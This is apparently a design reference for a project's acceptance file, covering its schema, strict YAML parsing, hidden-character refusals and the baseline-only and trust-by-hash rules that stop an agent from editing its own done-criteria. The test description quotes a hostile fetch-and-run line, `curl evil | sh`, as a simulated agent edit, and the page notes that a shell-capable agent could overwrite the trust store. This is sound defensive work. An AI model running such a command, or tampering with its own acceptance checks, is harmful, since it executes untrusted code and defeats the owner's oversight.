# Proof-of-Done: the acceptance file (version 1)

`.chatmcp/acceptance.yml` says what "done" means for a task in a workspace: a list of criteria, each proved by commands (`checks`) or by
something a person looks at (`manual`). This page is the reference for version 1 of the file and for the rules that decide which of its
commands may ever run. It belongs to phase P4 (Proof-of-Done core), plan task pod-20.

The identifier keeps the old name (`.chatmcp/`, see [NAMING.md](NAMING.md)), like every other folder and file name the Hub reads.

**What exists today:** the reader, the schema, the baseline rule, the trust store and the proposal (`DATGOLD-HUB/lib/proof/acceptance.mjs`,
`lib/proof/yaml-subset.mjs`, `lib/proof/trust-store.mjs`). The owner trusts a file with
`chatmcp verify trust` ([PROOF-CLI.md](PROOF-CLI.md), pod-24). A trusted file's checks run on every final answer of the agent
(the done-gate, [PROOF-GATE.md](PROOF-GATE.md), pod-23). The Hub shows the file and takes the owner's trust over HTTP
([PROOF-HUB-API.md](PROOF-HUB-API.md), pod-33). **What does not exist yet:** an approval dialog in the app (the Proof tab, pod-34).

## Example

```yaml
version: 1
criteria:
  - id: unit-tests
    text: All unit tests pass
    checks:
      - run: npm test
      - run: "node scripts/check.mjs --tag '#7'"   # quote a command that holds " #"
        cwd: tools
        timeout: 120        # seconds
        expect:
          exit: 0
        repeat: 2
  - id: ui.header
    text: >
      The header shows the product name
      and the gold mark.
    manual:
      inspect:
        - ui/src/App.tsx
      note: |
        Open the app and look at the top left.
protected:
  - tests/**
  - .chatmcp/**
reproduce:
  setup:
    - npm ci
```

## Schema

| Key | Type | Rule |
|---|---|---|
| `version` | integer | required, exactly `1` (a quoted `"1"`, `1.0` or `2` is refused) |
| `criteria` | list | required, 1 to 100 criteria |
| `criteria[].id` | text | required, `^[a-z0-9][a-z0-9._-]{0,63}$`, unique in the file |
| `criteria[].text` | text | required, 1 to 2000 characters |
| `criteria[].checks` | list | 1 to 20 checks; a criterion has `checks` **or** `manual`, never both and never neither |
| `checks[].run` | text | required, the command, 1 to 4000 characters |
| `checks[].cwd` | text | optional, default `.`; a relative folder inside the workspace (see below) |
| `checks[].timeout` | integer | optional, seconds, 1 to 3600, default 600 |
| `checks[].expect.exit` | integer | optional, the exit code that passes, 0 to 255, default 0 |
| `checks[].repeat` | integer | optional, how many times the check must pass, 1 to 20, default 1 |
| `criteria[].manual` | mapping | `inspect` (list of up to 50 relative paths or globs) and/or `note` (text, up to 4000 characters); at least one |
| `protected` | list | optional, up to 200 relative globs the agent must not change (enforced later, by the done-gate) |
| `reproduce.setup` | list | optional, up to 50 commands that prepare a clean checkout before the checks |

Every mapping refuses keys it does not list (`unknown_key`). The reader returns the file normalised: every default filled in, every path in
one spelling (`./tools/` becomes `tools`), `manual.inspect` always a list and `manual.note` text or null.

**Paths.** `cwd`, `inspect` and `protected` are relative to the workspace. Refused (`cwd_outside_workspace` for `cwd`,
`path_outside_workspace` for the others): an absolute path (`/x`, `\x`, `C:\x`), a drive-relative one (`D:x`), a UNC path (`\\server\x`),
`~`, any `..` segment and any `:`. A `cwd` is also refused (`reserved_name`) when one of its parts is a Windows device name, with or
without an extension (`CON`, `PRN`, `AUX`, `NUL`, `COM0`-`COM9`, `LPT0`-`LPT9`, also with a superscript digit, `CONIN$`, `CONOUT$`), or
ends in a dot or a space (`....`, `a `). This is a check of the text only: containment must be checked again on the **real** path at
run time (a symbolic link or a junction inside the workspace can point outside), which is the check runner's job (pod-21), because only
the runner sees the disk then. It does: ShellRunner resolves the folder through the workspace, which refuses a real path outside it
(`symlink_escape`) before anything runs.

**Hidden characters.** The owner approves a file by its hash after reading it, so the text read must be the text that runs. Every
string of the schema (`run`, `cwd`, `setup`, `text`, `note`, `inspect`, `protected`; an `id` is ASCII anyway) refuses
(`hidden_character`) control characters other than TAB and LF, format characters (bidi controls such as U+202E and U+2066-U+2069,
zero-width characters, tag characters), every default-ignorable code point (this includes variation selectors), line and paragraph
separators, noncharacters and lone surrogates, whether written raw or as an escape (`"\e"`, `"‮"`). A line break is allowed only in
a block scalar, where the file shows it. The YAML layer already refuses raw C0 and C1 controls (`control_character`) and raw U+2028 and
U+2029.

**Comments in commands.** A plain value ends at ` #`. For `run` and `setup`, a plain value that lost a comment there is refused
(`ambiguous_comment`) when the part kept holds a quote or a backtick (`run: echo "a # b"` would run `echo "a`): quote the whole command
or use a block scalar. `run: npm test # the unit tests` stays valid.

## The YAML that is read

The Hub has no runtime dependencies, so the file is read by its own strict subset of YAML 1.2 (`lib/proof/yaml-subset.mjs`):

- block mappings with plain keys (letters, digits, `_`, `-`, `.`), block sequences (also at the indentation of their key, and
  `- key: value` items), comments;
- plain scalars, single-quoted (`''` is a quote) and double-quoted scalars (escapes `\\ \" \/ \n \t \r \0 \b \f \e \a \v \  \xHH \uHHHH
  \UHHHHHHHH`), each on one line;
- literal `|` and folded `>` block scalars with the chomping indicators `-` (strip) and `+` (keep) and an indentation indicator `1`-`9`;
- one `---` before the content; one UTF-8 byte order mark at the start; LF or CRLF line breaks.

A plain value is an integer when it is `-?(0|[1-9][0-9]*)`, `true` or `false` a boolean, `null`, `~` or nothing a null, and text in
every other case (`1.5`, `0x10`, `007`, `yes` are text). A quoted or block value is always text. A plain value ends at ` #` (a comment);
quote a command that contains ` #` or `: `.

Everything else is refused with the line and a reason, never guessed at:

| Reason | What |
|---|---|
| `anchor`, `alias`, `tag` | `&a`, `*a`, `!x` / `!!int` |
| `flow_collection` | `{...}`, `[...]` (also `[]`): write block style |
| `multiple_documents`, `directive` | a second `---`, a `...`, `%YAML` |
| `duplicate_key` | the same key twice in one mapping |
| `tab_indent`, `bad_indent` | a tab in the indentation; a line indented where nothing can start (also a plain value continued on the next line) |
| `complex_key`, `unsupported_key` | `? key`, a quoted key, a key with spaces |
| `unclosed_quote`, `bad_escape`, `trailing_content` | a quote not closed on its line, an unknown escape, text after the closing quote |
| `unexpected_sequence`, `reserved_indicator`, `block_scalar_header`, `syntax` | `key: - x`, a value starting with `@` or a backtick, `|x`, `a: b: c` |
| `not_utf8`, `bom_misplaced`, `control_character`, `bare_cr`, `hidden_character` | bytes that are not UTF-8 (a UTF-16 file), a BOM after the start, NUL and every other C0 or C1 control character but TAB, a lone CR, a raw U+2028 or U+2029 |
| `too_large`, `too_deep` | more than 64 KiB; collections nested more than 16 deep |

The schema adds its own reasons: `empty_file`, `not_a_mapping`, `unknown_key`, `missing_version`, `unsupported_version`, `missing_key`,
`bad_type`, `bad_value`, `bad_id`, `duplicate_id`, `empty_criteria`, `check_and_manual`, `no_check_or_manual`, `empty_checks`,
`empty_manual`, `cwd_outside_workspace`, `path_outside_workspace`, `reserved_name`, `hidden_character`, `ambiguous_comment`,
`too_many`. An error is an `AcceptanceError` with
`code: 'acceptance_invalid'`, `line` (the physical line, counted the same with CRLF and a BOM), `reason` and a message such as
`.chatmcp/acceptance.yml line 8: aliases (*) are not supported`.

## The two rules: baseline only, trust by hash

The agent can write every file of the workspace, this one included. A command read from a file the agent can write and then run without a
person's approval is remote code execution for anyone who can get text into the workspace (a dependency, a pasted issue, a web page the
agent read). So these two rules are not options:

1. **Baseline only.** The criteria of a task always come from the **baseline** copy of the file: its bytes when the task started, which
   the caller passes in (from the task's baseline tree or a git blob). An edit made during the task can neither drop nor weaken a
   criterion: `resolveAcceptance` still returns the baseline's criteria and reports the edit as `acceptance_edited`, with the ids that
   were `removed`, `added` and `changed`, the other parts that changed (`protected`, `reproduce`, `criteria_order`), whether the file was
   `deleted`, and the line and reason when the new file does not read (`unparseable`). Any byte change is reported, also a comment. A
   file the agent creates when there was none at the start gives no criteria (`blocked: 'no_baseline'`). A baseline that does not read
   throws: it is the owner's file to fix, and it is never read as "no criteria".
2. **Trust by hash.** A check may run only when the sha256 of the exact bytes of the baseline file is in
   `<hub data folder>/proof/trusted-acceptance.json`, recorded after the owner approved that file. The agent's file tools refuse the
   Hub's data folder (a shell command can still write it; see below). Any edit changes the hash, so an edited file is untrusted until the owner approves it again. Without trust,
   `runnable` is empty and `blocked` is `acceptance_untrusted`. Only the answer `true` of the store counts.

The trust store (`createTrustStore(hubDir)`) has `trust(sha256, {approvedBy, at})`, `isTrusted(sha256)`, `revoke(sha256)` and `list()`.
Its file is `{"version": 1, "trusted": {"<sha256>": {"approvedBy": "...", "at": "<ISO time>"}}}`, written atomically (temporary file and
rename) with writes taken in turn inside the process. It is read strictly: bad JSON, another version, an extra key, a key that is not a
digest, an entry without exactly its two fields, more than 1 MiB or a folder in its place make the **whole** file "nothing trusted", never
"all trusted"; the next `trust()` moves the corrupt file aside as `trusted-acceptance.corrupt-<time>-<n>.json` and writes a valid one.
`chatmcp verify trust` (the CLI, pod-24) and the Hub's route (`POST /api/proof/trust-acceptance`, pod-33) call `trust()`; the approval dialog in the Proof tab (pod-34) will use the route.

**The bytes must come from one source.** The hash is over the exact bytes, so the same file with CRLF and with LF line breaks has two
hashes. The bytes hashed when the owner approves and the bytes passed as the baseline at task start must be read the same way (the raw
bytes of the working-tree file, not a copy re-encoded by Git or an editor); otherwise a trusted file looks untrusted. That fails closed
(nothing runs), but pod-21 and pod-24 must read the file the same way.

**What the store does and does not protect against.** It protects against commands put into the workspace file (a dependency, a pasted
issue, a page the agent read, an edit the agent makes with its file tools, which refuse the Hub's data folder). It does not protect
against an agent that can run shell commands as the same user: an approved `run_command`, or anything under Full Access, can write
`trusted-acceptance.json` like any other file of that user. The store is "unconfined" in the same sense as the ledger of the plan; a
confined store needs the separated execution account.

## API

```js
import { parseAcceptance, compareAcceptance, resolveAcceptance, proposeAcceptance, acceptanceSha256 } from './lib/proof/acceptance.mjs';
import { createTrustStore } from './lib/proof/trust-store.mjs';

const store = createTrustStore(hubDir);
const result = await resolveAcceptance({ baseline: baselineBytes, current: currentBytesOrNull, trustStore: store });
// result: {criteria, protected, reproduce, baselineSha256, currentSha256, trusted, blocked, edit,
//          runnable: [{criterionId, index, run, cwd, timeout, expect: {exit}, repeat}]}
```

`proposeAcceptance(workspace)` builds a proposed file from what `discoverProjectChecks` finds (npm scripts, TypeScript, Playwright,
pytest, `dotnet test` for a `.sln`/`.slnx` or project file in the root, Cargo, Go, make): one criterion per check, or one manual criterion
to fill in when nothing is found, with `.chatmcp/**` protected. It returns `{file, text, sha256, acceptance, suggested, skipped}`, writes nothing and
runs nothing; `verify init` (the CLI, pod-24) will print it. A discovered check whose criterion the reader would refuse (a solution
file whose name holds a hidden character, say) is left out and listed in `skipped` as `{command, from, reason}`.

## Tests

`DATGOLD-HUB/tests/verify-proof-acceptance.mjs` (more than 60 malformed files, each with its line and reason; valid files to the exact
object; a scripted agent edit that adds `run: curl evil | sh` and deletes a criterion, with a canary file that stays absent through a
stand-in runner that runs only what the API calls runnable; the trust store, corrupt and concurrent; the proposal on Node, Python and .NET
projects) and its mutation list `tests/mutation/proof-acceptance.json`.
